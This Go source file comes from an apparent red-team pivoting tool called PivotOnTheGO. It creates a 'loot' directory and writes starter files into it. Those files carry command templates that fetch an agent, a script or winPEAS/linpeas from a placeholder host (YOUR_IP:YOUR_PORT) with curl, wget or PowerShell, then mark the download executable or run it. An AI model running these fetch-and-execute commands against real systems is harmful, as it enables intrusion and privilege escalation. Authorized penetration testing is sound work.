package core

import (
	"os"
	"path/filepath"
	"time"
)

// DefaultAppDataDir returns a per-user app data directory for PivotOnTheGO.
// Example: ~/.local/share/PivotOnTheGO on Linux. If the new path does not exist
// but an older SwissArmyToolkit directory exists, it falls back to the legacy
// path to avoid breaking existing data.
func DefaultAppDataDir() (string, error) {
	home, err := os.UserHomeDir()
	if err != nil {
		return "", err
	}
	newPath := filepath.Join(home, ".local", "share", "PivotOnTheGO")
	oldPath := LegacyAppDataDirPath()

	if _, err := os.Stat(newPath); err == nil {
		return newPath, nil
	}
	if _, err := os.Stat(oldPath); err == nil {
		return oldPath, nil
	}
	return newPath, nil
}

// LegacyAppDataDirPath returns the historical app data dir path.
func LegacyAppDataDirPath() string {
	home, _ := os.UserHomeDir()
	return filepath.Join(home, ".local", "share", "SwissArmyToolkit")
}

// DefaultLootDir returns the default loot directory path.
func DefaultLootDir() (string, error) {
	base, err := DefaultAppDataDir()
	if err != nil {
		return "", err
	}
	return filepath.Join(base, "loot"), nil
}

// InitLootDir ensures the loot directory exists and has starter files.
func InitLootDir() (string, error) {
	lootDir, err := DefaultLootDir()
	if err != nil {
		return "", err
	}

	if err := os.MkdirAll(lootDir, 0o755); err != nil {
		return "", err
	}

	marker := filepath.Join(lootDir, ".initialized")
	if _, err := os.Stat(marker); err == nil {
		return lootDir, nil
	}

	if err := writeIfNotExists(filepath.Join(lootDir, "README_LOOT.txt"), defaultLootReadme()); err != nil {
		return "", err
	}
	if err := writeIfNotExists(filepath.Join(lootDir, "commands_linux.txt"), defaultLinuxCommands()); err != nil {
		return "", err
	}
	if err := writeIfNotExists(filepath.Join(lootDir, "commands_windows.txt"), defaultWindowsCommands()); err != nil {
		return "", err
	}

	_ = os.WriteFile(marker, []byte(time.Now().Format(time.RFC3339)), 0o644)
	return lootDir, nil
}

func writeIfNotExists(path string, content string) error {
	if _, err := os.Stat(path); err == nil {
		return nil
	}
	return os.WriteFile(path, []byte(content), 0o644)
}

func defaultLootReadme() string {
	return `PivotOnTheGO Loot Directory

This folder is used as the default root for the built-in file server
and the Loot / File Browser. You can drop tools, scripts, and payloads
here and use the UI to generate per-file download one-liners.

Starter files:
- commands_linux.txt   : example curl/wget agent & loot download commands
- commands_windows.txt : example PowerShell Invoke-WebRequest examples

You are responsible for using these commands only in labs or environments
where you have explicit authorization.
`
}

func defaultLinuxCommands() string {
	return `# Linux Download Examples (adjust IP/port/filenames as needed)

# Basic curl download
curl -o agent http://YOUR_IP:YOUR_PORT/agent

# Basic wget download
wget -O agent http://YOUR_IP:YOUR_PORT/agent

# Make downloaded file executable
chmod +x agent

# Example: download linpeas
curl -o linpeas.sh http://YOUR_IP:YOUR_PORT/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
`
}

func defaultWindowsCommands() string {
	return `# Windows PowerShell Download Examples (run in an elevated prompt if needed)

# Download a file with Invoke-WebRequest
powershell -Command "Invoke-WebRequest -Uri 'http://YOUR_IP:YOUR_PORT/agent.exe' -OutFile 'agent.exe'"

# Download and execute a script
powershell -Command "Invoke-WebRequest -Uri 'http://YOUR_IP:YOUR_PORT/script.ps1' -OutFile 'script.ps1'; .\\script.ps1"

# Example: download winPEAS
powershell -Command "Invoke-WebRequest -Uri 'http://YOUR_IP:YOUR_PORT/winpeas.exe' -OutFile 'winpeas.exe'"
`
}
